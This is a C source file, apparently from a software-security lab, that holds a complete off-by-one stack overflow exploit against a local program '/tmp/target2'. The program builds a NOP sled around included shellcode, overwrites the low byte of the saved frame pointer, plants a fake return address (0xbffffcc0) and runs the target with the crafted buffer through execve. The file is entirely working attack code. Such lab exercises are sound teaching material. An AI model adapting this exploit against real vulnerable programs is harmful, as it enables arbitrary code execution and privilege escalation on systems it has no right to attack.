#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define BUFFERSIZE 240
#define OVERFLOWSIZE BUFFERSIZE + 2
#define NOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;
  args[1] = "hi there";
  args[2] = NULL;
  env[0] = NULL;

  char buffer[OVERFLOWSIZE];
  memset(buffer, NOP, OVERFLOWSIZE);

  char *ptr_shell = buffer;

  int bsize = OVERFLOWSIZE;
  ptr_shell = buffer + ((bsize / 2) - (strlen(shellcode) / 2));

  // Paste the shellcode in the middle of the buffer
  int i = 0;
  for (i = 0; i < strlen(shellcode); i++)
  {
    *(ptr_shell++) = shellcode[i];
  }

  // modify the last byte of the ebp
  *(buffer + 240) = 0x70;

  // set the fake ret in middle of NOPs at 0xbffffcc0 modifying 1B of the ebp address
  *(int *)(buffer + 236) = 0xbffffcc0;

  buffer[OVERFLOWSIZE - 1] = '\0';

  args[1] = buffer;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
